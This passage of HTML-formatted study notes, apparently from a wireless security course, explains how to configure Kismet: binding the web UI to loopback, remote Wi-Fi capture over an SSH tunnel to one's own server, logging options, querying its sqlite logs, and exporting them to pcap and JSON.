on all interfaces, allowing for remote connections to the UI. </p><p>we can configure Kismet&#39;s web server to listen on our loopback interface by adding &quot;httpd_bind_address=127.0.0.1&quot; to our kismet_site.conf override file.</p><p><img src="images/28-1.png" alt="images/28-1.png" /></p><p></p><p> </p><p>Killing Kismet process</p><p></p><p> <img src="images/28-2.png" alt="images/28-2.png" /></p></div><div class='page'><h1 class='title level-2'>Kismet remote</h1><br/><p>Kismet includes separate tools to capture data. When we run Kismet and specify a source, it will automatically use the appropriate tool. For example, when we run a capture on wlan0 on Kali, Kismet calls the kismet_cap_linux_wifi tool to handle the capture.</p><p></p><p><h3>We can also call these tools directly to capture traffic locally and send the data to a Kismet server running on a remote host.</h3></p><p></p><p>T<h3>he server does not initiate the capture, but it listens for connections and processes the data. Kismet only allows connections from localhost by default.</h3></p><p></p><p><h3>We can use this functionality to capture Wi-Fi data on several smaller, cheaper devices and send the data to one centralized server for processing and retention.</h3></p><p></p><p>T<h3>o enable remote capture, we need to setup an SSH tunnel to the server or configure the remote instance of Kismet to listening on a specific network interface. We can do the latter by changing the </h3><em>remote_capture_listen</em><h3> value to a specific interface in our override file.</h3></p><p></p><p>E.g </p><p></p><p>1. sudo kismet</p><p>	start kismet on local machine  </p><p></p><p>2. ssh kali@192.168.62.192 -L 8000:localhost:3501</p><p>	we will establish the SSH tunnel from kaliremote, our capturing instance, to our kali host. Since Kismet listens on localhost port 3501, we need to use port forwarding when we establish our SSH tunnel. We will use ssh with the -L flag to enable port forwarding so that port 8000 on kaliremote forwards to port 3501 on our kali host.</p><p></p><p>3. sudo kismet_cap_linux_wifi --connect 127.0.0.1:8000 --source=wlan0</p><p>	After establishing an SSH tunnel, we will open a new terminal on kaliremote and start a data capture. Let&#39;s use kismet_cap_linux_wifi with the --	connect flag set to localhost:8000 and set our --source to wlan0 to use the local wireless network. Since we have forwarded port 8000 through 	our SSH tunnel to port 3501, kismet_cap_linux_wifi should send the data to our kali host.</p><p>	<img src="images/29-1.png" alt="images/29-1.png" /></p><p>	</p><p>	At this point, the Kismet instance on kaliremote captures Wi-Fi data and sends it through the SSH tunnel to the Kismet server on our kali host.</p></div><div class='page'><h1 class='title level-2'>Kismet logging</h1><br/><p></p><p>Log Files</p><p>We have already explored how to configure logging with an override file. We can also use several command line flags to control logging at runtime.</p><p></p><p> -T, --log-types &lt;types&gt;      Override activated log types</p><p> -p, --log-prefix &lt;prefix&gt;    Directory to store log files</p><p> -n, --no-logging             Disable logging entirely</p><p> </p><p> </p><p> use the sqlite3 tool to interact with kismet files.</p><p> </p><p> <img src="images/30-1.png" alt="images/30-1.png" /></p><p> </p><p> </p><p> • The <em>KISMET</em> table contains the database version and which version of Kismet created the log file.</p><p>• The <em>alerts</em> table contains any alerts or WIDS issues.</p><p>• The <em>data</em> table contains records that are not packet related, such as SDR data.</p><p>• The <em>datasources</em> table contains information about the data sources used to capture data.</p><p>• The <em>devices</em> table contains information about the devices Kismet was able to identify.</p><p>• The <em>messages</em> table contains informational messages, such as those displayed in the console or web application.</p><p>• The <em>packets</em> table contains the raw packets captured by Kismet. The table can contain multiple DLTs.</p><p>• The <em>snapshots</em> table contains time-based information.</p><p></p><p></p><p><img src="images/30-2.png" alt="images/30-2.png" /></p><p></p><p></p><p>We can also run an SQLite query as a one liner by using sqlite3, specifying a log file, and then a query as one command.</p><p></p><p>sudo sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet &quot;select type, devmac from devices;&quot;</p><p></p><p></p><p>Reading log files</p><p></p><p>Kismet can use log files as a data source, including Pcap or PcapNg capture files. When reprocessing a file, Kismet attempts to replay through the file as fast as possible. We can throttle the processing with the pps and realtime options. These options are mutually exclusive.</p><p></p><p>e.g <strong>sudo kismet -c Documents/Network_Join_Nokia_Mobile.pcap:</strong><strong><span style="color:#e01b24;">realtime=true</span></strong></p></div><div class='page'><h1 class='title level-2'>Exporting</h1><br/><p></p><p><h3>Pcap</h3></p><p></p><p>Even if we only have kismet log files, we can use the kismetdb_to_pcap1 tool to convert kismet logs to Pcap and PcapNg logs.</p><p></p><p>we must keep in mind that Kismet can capture multiple data types from multiple data sources. There are tools that cannot handle different data types within a PcapNg file.</p><p></p><p>Let&#39;s run kismetdb_to_pcap, specifying our kismet log file with --in, and using --list-datasources to get a list of data sources in that log file.</p><p></p><p>kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --out sample.pcapng --verbose</p><p></p><p><img src="images/31-1.png" alt="images/31-1.png" /></p><p></p><p>Now that we have a PcapNg file, we could open it in Wireshark or other tools for further processing and analysis.</p><p></p><p></p><p></p><p><h3>JSON</h3></p><p></p><p><h3>We can convert kismet log files to JSON format using the </h3><em>kismetdb_dump_devices</em><sup><a href="https://portal.offensive-security.com/courses/pen-210/books-and-videos/modal/modules/kismet-essentials/exporting-data/json#fn1">1</a></sup><h3> tool.</h3></p><p></p><p><h3>Let&#39;s try it out. We&#39;ll use </h3><strong><h3>kismetdb_dump_devices</h3></strong><h3>, use the </h3><strong><h3>--in</h3></strong><h3> flag to specify our kismet log file, </h3><strong><h3>--out</h3></strong><h3> to set our output file, </h3><strong><h3>--skip-clean</h3></strong><h3> to skip the SQL vacuum</h3><sup><a href="https://portal.offensive-security.com/courses/pen-210/books-and-videos/modal/modules/kismet-essentials/exporting-data/json#fn2">2</a></sup><h3> command, and </h3><strong><h3>--verbose</h3></strong><h3> to enable verbose mode.</h3></p><p></p><p>kismetdb_dump_devices --in /var/log/kismet/Kismet-20200917-17-45-17-1.kismet --out sample.json --skip-clean --verbose</p><p></p><p><img src="images/31-2.png" alt="images/31-2.png" /></p><p></p><p>Many of the Kismet export tools run the SQL VACUUM command to optimize the sqlite database before exporting data from it. This process involves rewriting the log file and therefore requires write access to the log file. If we do not have write access, we can run the export tool with sudo or using the --skip-clean flag.</p></div>
</body>
</html>
